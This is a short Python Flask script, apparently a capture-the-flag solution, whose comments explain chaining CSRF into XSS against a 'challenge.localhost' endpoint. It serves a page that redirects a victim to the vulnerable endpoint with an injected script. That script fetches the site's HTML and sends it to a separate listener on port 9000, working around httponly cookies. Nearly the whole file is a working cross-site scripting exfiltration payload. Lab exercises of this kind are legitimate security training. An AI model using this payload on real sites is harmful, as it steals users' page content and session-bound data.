from flask import Flask
import requests
# Just as the last, we are using CSRF to perform XSS. But we cannot send the document.cookie
# as it has been set to httponly. We can however read from the website itself. This involves
# a confusing fetch request where we fetch the homesite (we are injecting into the endpoint
# and so this doesn't violate CORS, because the script will be executing from the site itself)
# the response of that is converted to text and the output of that is then fetched again
# by being placed in the get request arg. The response URL can be decoded here for example:
# https://meyerweb.com/eric/tools/dencoder/
app = Flask(__name__)

@app.route("/")
def respond():
    url = "http://challenge.localhost/ephemeral"

    leak_url = "http://challenge.localhost:9000"
    form_html = f"""<script>
    let payload = "<script>fetch('http://challenge.localhost/').then(response=>response.text()).then(html=>fetch('{leak_url}?msg='+encodeURIComponent(html)));</s"+"cript>";
    window.location.href="{url}?msg="+encodeURIComponent(payload);
    </script>
    """
    return form_html

app.run(debug=True, port=1337)
